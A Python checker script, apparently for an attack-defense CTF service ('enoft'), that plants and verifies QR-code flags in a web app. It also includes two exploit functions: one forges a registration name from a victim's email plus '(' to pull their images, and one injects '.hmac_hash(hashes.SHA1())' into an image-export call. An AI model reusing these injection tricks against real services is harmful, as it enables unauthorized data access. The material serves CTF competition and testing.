from logging import LoggerAdapter
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage
)
from typing import Optional
from utils import InteractionManager, generate_random_string
from bs4 import BeautifulSoup
import qr_codes

SERVICE_PORT = 8008
checker = Enochecker("enoft", 8008)
def app(): return checker.app


@checker.putflag(0)
async def putflag_email(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    flag = task.flag
    qrCode = qr_codes.create_qr_code(flag)
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)

    await m.register(vendor_lock=True)
    await m.upload_image(qrCode)
    data = m.dump_info()
    await db.set("credentials", data)

    return data["email"]


@checker.getflag(0)
async def getflag_email(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    logger.info("Getting flag")
    try:
        credentials = await db.get("credentials")
    except BaseException:
        raise MumbleException("No credentials saved in db")
    logger.info(f"Got credentials: {credentials}")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, email_name_key=credentials)
    await m.login()
    imgs = await m.download_profile_images_from_self()
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Downloaded {len(imgs)} images")
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    logger.info(f"Decoded images: {imgs}")
    assert_in(task.flag, imgs, "Flag not found in images")


@checker.exploit(0)
async def exploit_email(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter
) -> Optional[str]:
    logger.info(f"Exploiting {task.attack_info} ")
    email = task.attack_info
    name = email + "("
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, forced_name=name)
    await m.register()
    imgs = await m.download_profile_images_from_email(email)
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Downloaded {len(imgs)} images")
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    logger.info(f"Decoded images: {imgs}")
    return imgs[0]


@checker.putflag(1)
async def putflag_export(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    flag = task.flag
    qrCode = qr_codes.create_qr_code(flag)
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)

    await m.register(low_quality=True)
    await m.upload_image(qrCode)
    data = m.dump_info()
    await db.set("credentials", data)
    return data["email"]


@checker.getflag(1)
async def getflag_export(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
) -> None:
    logger.info("Getting flag")
    try:
        credentials = await db.get("credentials")
    except BaseException:
        raise MumbleException("No credentials saved in db")
    logger.info(f"Got credentials: {credentials}")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, email_name_key=credentials)
    try:
        await m.login()
    except BaseException:
        raise MumbleException("Error logging in")
    try:
        imgs = await m.get_profile_image_urls(credentials["email"])
    except BaseException:
        raise MumbleException("Error getting profile")
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Got {len(imgs)} images")
    img_url = imgs[0]
    try:
        img = await m.export_image_url(img_url)
    except BaseException:
        raise MumbleException("Error exporting image")
    if not img:
        logger.error("Image not exported")
        raise MumbleException("No images found")
    flag = qr_codes.read_qr_code(img)
    logger.info(f"Decoded image: {flag}")
    assert_equals(task.flag, flag, "Flag not found in image")


@checker.exploit(1)
async def exploit_export(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter
) -> Optional[str]:
    logger.info(f"Exploiting {task.attack_info} ")
    email = task.attack_info
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)
    await m.register()
    urls = await m.get_profile_image_urls(email)
    if not urls:
        raise MumbleException("No images found")
    logger.info(f"Got {len(urls)} images")
    img_url = urls[0]
    try:
        img = await m.export_image_url(img_url, ".hmac_hash(hashes.SHA1())")
    except BaseException:
        raise MumbleException("Error exporting image")
    if not img:
        logger.error("Image not exported")
        raise MumbleException("No images found")
    flag = qr_codes.read_qr_code(img)
    logger.info(f"Decoded image: {flag}")
    return flag


@checker.putnoise(0)
async def putnoise_0(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
):
    random_string = generate_random_string(20)
    await db.set("random_string", random_string)
    logger.info("Putting noise")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)
    try:
        await m.register(vendor_lock=True)
    except BaseException:
        raise MumbleException("Error registering")

    try:
        await m.upload_image(qr_codes.create_qr_code(random_string))
    except BaseException:
        raise MumbleException("Error uploading image")
    logger.info("Noise put")
    data = m.dump_info()
    await db.set("credentials", data)


@checker.getnoise(0)
async def getnoise_0(
    task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
):
    logger.info("Getting noise")
    try:
        credentials = await db.get("credentials")
    except BaseException:
        raise MumbleException("No credentials saved in db")
    noise = await db.get("random_string")
    logger.info(f"Got credentials: {credentials}")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, email_name_key=credentials)
    try:
        await m.login()
    except BaseException:
        raise MumbleException("Error logging in")
    try:
        imgs = await m.download_profile_images_from_self()
    except BaseException:
        raise MumbleException("Error getting profile")
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Downloaded {len(imgs)} images")
    imgs = [qr_codes.read_qr_code(img) for img in imgs]
    logger.info(f"Decoded images: {imgs}")
    assert_in(noise, imgs, "Noise not found in images")


@checker.putnoise(1)
async def putnoise_1(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter
):
    random_string = generate_random_string(20)
    await db.set("random_string", random_string)
    logger.info("Putting noise")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger)
    try:
        await m.register(low_quality=True)
    except BaseException:
        raise MumbleException("Error registering")

    try:
        await m.upload_image(qr_codes.create_qr_code(random_string))
    except BaseException:
        raise MumbleException("Error uploading image")
    logger.info("Noise put")
    data = m.dump_info()
    await db.set("credentials", data)


@checker.getnoise(1)
async def getnoise_1(
    task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
):
    logger.info("Getting noise")
    try:
        credentials = await db.get("credentials")
    except BaseException:
        raise MumbleException("No credentials saved in db")
    noise = await db.get("random_string")
    logger.info(f"Got credentials: {credentials}")
    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
    m = InteractionManager(address, logger, email_name_key=credentials)
    try:
        await m.login()
    except BaseException:
        raise MumbleException("Error logging in")
    try:
        imgs = await m.get_profile_image_urls(credentials["email"])
    except BaseException:
        raise MumbleException("Error getting profile")
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Got {len(imgs)} images")
    img_url = imgs[0]
    try:
        img = await m.export_image_url(img_url)
    except BaseException:
        raise MumbleException("Error exporting image")
    if not img:
        logger.error("Image not exported")
        raise MumbleException("No images found")
    flag = qr_codes.read_qr_code(img)
    logger.info(f"Decoded image: {flag}")
    assert_equals(noise, flag, "Noise not found in image")


@checker.havoc(0)
async def havoc_0(task: HavocCheckerTaskMessage, logger: LoggerAdapter):
    logger.info("Havoc")
    m = InteractionManager("http://" + task.address +
                           ":" + str(SERVICE_PORT) + "/", logger)
    main = await m.get_home_page()
    soup = BeautifulSoup(main, "html.parser")
    imgs = soup.find_all("img")
    imgs = [img["src"] for img in imgs]
    if not imgs:
        raise MumbleException("No images found")
    logger.info(f"Found images: {imgs}")
    if "/static/logo.png" not in imgs:
        raise MumbleException("Logo not found")


if __name__ == "__main__":
    checker.run()
